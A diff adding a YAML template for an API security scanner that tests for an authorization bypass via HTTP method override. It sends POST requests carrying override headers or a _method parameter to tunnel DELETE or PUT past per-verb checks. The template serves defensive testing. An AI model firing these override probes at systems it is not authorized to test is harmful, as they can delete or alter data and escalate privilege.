@@ -1,0 +1,108 @@
+# Template: HTTP Method Override Header Exploitation
+# Many frameworks (Spring, Rails, Express w/ method-override middleware, IIS)
+# honor headers like X-HTTP-Method-Override to "tunnel" non-POST methods
+# through a POST request. If authorization is enforced on the wire method
+# (POST) but routing dispatches on the override (DELETE), an attacker can
+# bypass per-method authz with a normal POST request. The query-string
+# `_method=` parameter is the Rails/Sinatra equivalent.
+
+id: 10-api5-http-method-override
+
+info:
+  name: "HTTP Method Override - Tunneled Verb Authorization Bypass"
+  category: "API5:2023"
+  severity: "HIGH"
+  author: "hadrian"
+  description: |
+    Tests whether the API honors method-override headers/parameters to
+    smuggle a privileged verb through a benign POST/GET request. Sends a
+    POST to the operation's path with the attacker's (lower-privilege)
+    token plus one of the well-known override mechanisms:
+      - X-HTTP-Method-Override: DELETE
+      - X-HTTP-Method: DELETE
+      - X-Method-Override: DELETE
+      - ?_method=DELETE query string
+    A 2xx response indicates the framework dispatched on the overridden
+    method, bypassing any per-verb authorization on DELETE.
+  tags: ["http-method-tampering", "method-override", "owasp", "owasp-api-top10", "api5", "authorization", "privilege-escalation"]
+  requires_llm_triage: true
+  test_pattern: "simple"
+
+endpoint_selector:
+  requires_auth: true
+  methods: ["GET", "POST", "PUT", "PATCH", "DELETE"]
+
+role_selector:
+  attacker_permission_level: "lower"
+  victim_permission_level: "higher"
+
+http:
+  # Classic Microsoft/Java override header
+  - method: "POST"
+    path: "{{operation.path}}"
+    headers:
+      Content-Type: "application/json"
+      X-HTTP-Method-Override: "DELETE"
+    body: "{}"
+    matchers:
+      - type: status
+        status: [200, 202, 204]
+  # IBM/Google flavor
+  - method: "POST"
+    path: "{{operation.path}}"
+    headers:
+      Content-Type: "application/json"
+      X-HTTP-Method: "DELETE"
+    body: "{}"
+    matchers:
+      - type: status
+        status: [200, 202, 204]
+  # Some middleware libraries
+  - method: "POST"
+    path: "{{operation.path}}"
+    headers:
+      Content-Type: "application/json"
+      X-Method-Override: "DELETE"
+    body: "{}"
+    matchers:
+      - type: status
+        status: [200, 202, 204]
+  # Rails/Sinatra _method query parameter
+  - method: "POST"
+    path: "{{operation.path}}?_method=DELETE"
+    headers:
+      Content-Type: "application/json"
+    body: "{}"
+    matchers:
+      - type: status
+        status: [200, 202, 204]
+  # Same probes targeting PUT (state mutation without DELETE permission)
+  - method: "POST"
+    path: "{{operation.path}}"
+    headers:
+      Content-Type: "application/json"
+      X-HTTP-Method-Override: "PUT"
+    body: "{}"
+    matchers:
+      - type: status
+        status: [200, 201, 204]
+
+# Detection: a 2xx response means the override was honored AND authz did
+# not re-check the resulting verb. 405/400 mean the server saw POST and
+# rejected the override path.
+detection:
+  success_indicators:
+    - type: status_code
+      status_code: 200
+    - type: status_code
+      status_code: 202
+    - type: status_code
+      status_code: 204
+  failure_indicators:
+    - type: status_code
+      status_code: 401
+    - type: status_code
+      status_code: 403
+    - type: status_code
+      status_code: 405
+  vulnerability_pattern: "method_override_bypassed_authorization"
